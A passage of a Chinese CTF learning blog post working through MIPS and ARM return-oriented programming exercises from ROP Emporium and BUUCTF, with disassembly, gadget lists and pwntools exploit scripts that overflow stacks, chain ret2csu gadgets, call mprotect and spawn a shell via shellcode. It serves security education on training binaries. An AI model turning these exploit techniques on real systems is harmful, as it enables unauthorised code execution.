+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004009A0                               loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j</span><br><span class="line">.text:004009A0 00 00 19 8E                   lw      $t9, 0($s0)</span><br><span class="line">.text:004009A4 01 00 31 26                   addiu   $s1, 1</span><br><span class="line">.text:004009A8 25 30 A0 02                   move    $a2, $s5		***</span><br><span class="line">.text:004009AC 25 28 80 02                   move    $a1, $s4		***</span><br><span class="line">.text:004009B0 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:004009B4 25 20 60 02                   move    $a0, $s3		***</span><br><span class="line">.text:004009B4</span><br><span class="line">.text:004009B8 F9 FF 51 16                   bne     $s2, $s1, loc_4009A0</span><br><span class="line">.text:004009BC 04 00 10 26                   addiu   $s0, 4</span><br><span class="line">.text:004009BC</span><br><span class="line">.text:004009C0</span><br><span class="line">.text:004009C0                               loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j</span><br><span class="line">.text:004009C0 34 00 BF 8F                   lw      $ra, 0x1C+var_s18($sp)</span><br><span class="line">.text:004009C4 30 00 B5 8F                   lw      $s5, 0x1C+var_s14($sp)		***</span><br><span class="line">.text:004009C8 2C 00 B4 8F                   lw      $s4, 0x1C+var_s10($sp)		***</span><br><span class="line">.text:004009CC 28 00 B3 8F                   lw      $s3, 0x1C+var_sC($sp)		***</span><br><span class="line">.text:004009D0 24 00 B2 8F                   lw      $s2, 0x1C+var_s8($sp)</span><br><span class="line">.text:004009D4 20 00 B1 8F                   lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004009D8 1C 00 B0 8F                   lw      $s0, 0x1C+var_s0($sp)		</span><br><span class="line">.text:004009DC 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:004009E0 38 00 BD 27                   addiu   $sp, 0x38</span><br></pre></td></tr></table></figure></div>
+
+<p>标***的表示需要注意，然后就是注意修改<code>$s0</code>为<code>ret2win</code>函数地址就行了</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;./ret2csu_mipsel&#x27;</span>])</span><br><span class="line"><span class="comment">#io = process(&#x27;./ret2csu_mipsel&#x27;)</span></span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x4009c0</span></span><br><span class="line">csu2 = <span class="number">0x4009a0</span></span><br><span class="line">ret2win_got = <span class="number">0x411058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(csu1) + p32(<span class="number">0</span>)*<span class="number">7</span> + p32(ret2win_got) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>) + p32(csu2)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive(</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h3 id="arm寄存器及函数调用前置知识"><a href="#arm寄存器及函数调用前置知识" class="headerlink" title="arm寄存器及函数调用前置知识"></a>arm寄存器及函数调用前置知识</h3><p>关于基础知识，已有很多师傅写的十分完善。参考：</p>
+<p>[ARM pwn 环境搭建+基础入门 | Pwn进你的心 (ywhkkx.github.io)](<a class="link"   target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM" >https://ywhkkx.github.io/2022/08/29/ARM <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> pwn 环境搭建+基础入门&#x2F;)</p>
+<h3 id="arm运行调试环境搭建"><a href="#arm运行调试环境搭建" class="headerlink" title="arm运行调试环境搭建"></a>arm运行调试环境搭建</h3><p>关于qemu的安装不在这里赘述，当我们执行<code>qemu-arm 目标程序</code>时会报错<code>/lib/ld-linux.so.3: No such file or directory</code></p>
+<p>为了解决这个问题，我们需要执行如下命令</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-armhf-cross</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ 目标程序</span><br></pre></td></tr></table></figure></div>
+
+<p>这样就可以运行目标arm程序了</p>
+<p>调试的话和mips大差不差，设置架构为arm就行</p>
+<h3 id="ret2win-1"><a href="#ret2win-1" class="headerlink" title="ret2win"></a>ret2win</h3><p>ret2text，直接覆盖返回地址就行</p>
+<p>exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-arm&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf/&#x27;,&#x27;-g&#x27;,&#x27;12345&#x27;,&#x27;./ret2win_armv5&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>,<span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(<span class="number">0x105ec</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="split-1"><a href="#split-1" class="headerlink" title="split"></a>split</h3><p>一个简单的ROP，只需要传个参就行了。使用ROPgadget查看可用gadget，发现如下gadget</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x000103a4 : pop &#123;r3, pc&#125;</span><br><span class="line">0x00010558 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>恰好可以完成我们的传参流程，exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;12345&#x27;</span>,<span class="string">&#x27;./split_armv5&#x27;</span>])</span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-arm&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf/&#x27;,&#x27;./split_armv5&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000103a4 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x00010558 : mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sys = <span class="number">0x105e0</span></span><br><span class="line">cat_flag = <span class="number">0x2103c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span>+p32(<span class="number">0x103a4</span>)+p32(cat_flag)+p32(<span class="number">0x10558</span>)+p32(<span class="number">0</span>)+p32(sys)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="callme-1"><a href="#callme-1" class="headerlink" title="callme"></a>callme</h3><p>后续题目均需要链接动态库，链接不上，一直报错，不做了md，找点buu的题做做</p>
+<h3 id="shanghai2018-baby-arm"><a href="#shanghai2018-baby-arm" class="headerlink" title="shanghai2018_baby_arm"></a>shanghai2018_baby_arm</h3><p>arm64架构的，先下载个libc，<code>sudo apt install libc6-dbg-arm64-cross</code></p>
+<p>然后<code>qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./arm</code>就可以运行了</p>
+<p>再看程序，先向bss段读入数据，然后向栈中读入数据，且存在溢出，并且可以观察到程序中有如下片段</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007C8                               ; __int64 sub_4007C8()</span><br><span class="line">.text:00000000004007C8                               sub_4007C8</span><br><span class="line">.text:00000000004007C8</span><br><span class="line">.text:00000000004007C8                               var_s0=  0</span><br><span class="line">.text:00000000004007C8</span><br><span class="line">.text:00000000004007C8 FD 7B BF A9                   STP             X29, X30, [SP,#-0x10+var_s0]!</span><br><span class="line">.text:00000000004007CC FD 03 00 91                   MOV             X29, SP</span><br><span class="line">.text:00000000004007D0 02 00 80 52                   MOV             W2, #0                  ; prot</span><br><span class="line">.text:00000000004007D4 01 00 82 D2                   MOV             X1, #0x1000             ; len</span><br><span class="line">.text:00000000004007D8 00 00 82 D2 20 08 A0 F2       MOV             X0, #off_411000         ; addr</span><br><span class="line">.text:00000000004007E0 88 FF FF 97                   BL              .mprotect</span><br><span class="line">.text:00000000004007E0</span><br><span class="line">.text:00000000004007E4 1F 20 03 D5                   NOP</span><br><span class="line">.text:00000000004007E8 FD 7B C1 A8                   LDP             X29, X30, [SP+var_s0],#0x10</span><br><span class="line">.text:00000000004007EC C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure></div>
+
+<p>因此我们可以先在bss段上写入shellcode，然后在栈溢出位置直接ROP执行mprotect修改bss段权限（使用ret2csu传参），并跳转执行shellcode</p>
+<p>（这题打的时候发现没开NX，但是checksec看到开了，直接跳转也可以拿到shell，但是学学ret2csu传参也是可以的）</p>
+<blockquote>
+<p><strong>这里简单看下arm64下的ret2csu</strong></p>
+<p>gadget如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC                               loc_4008AC                              ; CODE XREF: init+60↓j</span><br><span class="line">.text:00000000004008AC A3 7A 73 F8                   LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0 E2 03 16 AA                   MOV             X2, X22</span><br><span class="line">.text:00000000004008B4 E1 03 17 AA                   MOV             X1, X23</span><br><span class="line">.text:00000000004008B8 E0 03 18 2A                   MOV             W0, W24</span><br><span class="line">.text:00000000004008BC 73 06 00 91                   ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0 60 00 3F D6                   BLR             X3</span><br><span class="line">.text:00000000004008C0</span><br><span class="line">.text:00000000004008C4 7F 02 14 EB                   CMP             X19, X20</span><br><span class="line">.text:00000000004008C8 21 FF FF 54                   B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008C8</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC                               loc_4008CC                              ; CODE XREF: init+3C↑j</span><br><span class="line">.text:00000000004008CC F3 53 41 A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0 F5 5B 42 A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4 F7 63 43 A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8 FD 7B C4 A8                   LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure></div>
+
+<p>arm64下的X30寄存器存储着返回地址，这里可以看到X22, X23, X24分别对应X2, X1, X0寄存器，而X3寄存器由<code>LDR  X3, [X21,X19,LSL#3]</code>计算，即<code>X3 = [X21 + X19 &lt;&lt; 3]</code>，再通过调试确定一下对应值要在栈中写入的位置就行了</p>
+</blockquote>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;arm64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,28607)</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;./arm&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send((shellcode.ljust(<span class="number">0x198</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x4007e0</span>)).ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x4008cc</span></span><br><span class="line">csu2 = <span class="number">0x4008ac</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>+p64(csu1)+p64(<span class="number">0</span>)+p64(csu2)+p64(<span class="number">0</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0x411200</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x411068</span>)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;A&#x27;*0x48+p64(0x411068)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="biosctf2018-wARMup"><a href="#biosctf2018-wARMup" class="headerlink" title="biosctf2018-wARMup"></a>biosctf2018-wARMup</h3><p>这道题也是看着开了NX，但是bss段可执行，可以通过ROP在bss段上写入shellcode，然后进行跳转。然后来仔细看下每一步</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [sp+4h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to bi0s CTF!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x78</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>主要函数就这一个，存在溢出，可以写4个gadget。我们可以复用read函数，注意read函数部分汇编</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0001052C 68 30 4B E2                   SUB     R3, R11, #-buf</span><br><span class="line">.text:00010530 78 20 A0 E3                   MOV     R2, #0x78 ; &#x27;x&#x27;                 ; nbytes</span><br><span class="line">.text:00010534 03 10 A0 E1                   MOV     R1, R3                          ; buf</span><br><span class="line">.text:00010538 00 00 A0 E3                   MOV     R0, #0                          ; fd</span><br><span class="line">.text:0001053C 8E FF FF EB                   BL      read</span><br></pre></td></tr></table></figure></div>
+
+<p>由于<code>MOV R1, R3</code>，因此我们可以通过修改R3来修改read函数读入数据的地址，同时我们可以找到一个gadget</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010364 : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么接下来可以控制返回地址进行ROP了</p>
+<p>exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27856</span>)</span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-arm&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabihf/&#x27;, &#x27;-g&#x27;, &#x27;12345&#x27;, &#x27;./wARMup&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00010364 : pop &#123;r3, pc&#125;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x64</span>+p32(<span class="number">0x21040</span>)+p32(<span class="number">0x10364</span>)+p32(<span class="number">0x21040</span>)+p32(<span class="number">0x10530</span>)+p32(<span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.send(p32(<span class="number">0x21048</span>)+asm(shellcraft.sh()).rjust(<span class="number">0x74</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 异架构ROPemporium学习</li>
+        <li><strong>Author:</strong> Static</li>
+        <li><strong>Created at
+                :</strong> 2024-01-23 15:52:19</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-08-08 18:51:14
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://staticccccccc.github.io/2024/01/23/异架构pwn学习/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E5%BC%82%E6%9E%B6%E6%9E%84/">#异架构</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/01/23/CISCN2023_WP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">CISCN 2023 初赛pwn部分wp &amp; 复现</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/01/23/Pawnyable(2)%20-%20Heap%20Overflow/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Pawnable笔记（二）之 Heap Overflow</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">异架构ROPemporium学习</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPS"><span class="nav-text">MIPS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mips%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">mips寄存器及函数调用前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mips%E8%BF%90%E8%A1%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">mips运行调试环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2win"><span class="nav-text">ret2win</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#split"><span class="nav-text">split</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callme"><span class="nav-text">callme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write4"><span class="nav-text">write4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#badchars"><span class="nav-text">badchars</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fluff"><span class="nav-text">fluff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pivot"><span class="nav-text">pivot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2csu"><span class="nav-text">ret2csu</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARM"><span class="nav-text">ARM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arm%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">arm寄存器及函数调用前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arm%E8%BF%90%E8%A1%8C%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">arm运行调试环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2win-1"><span class="nav-text">ret2win</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#split-1"><span class="nav-text">split</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callme-1"><span class="nav-text">callme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shanghai2018-baby-arm"><span class="nav-text">shanghai2018_baby_arm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#biosctf2018-wARMup"><span class="nav-text">biosctf2018-wARMup</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
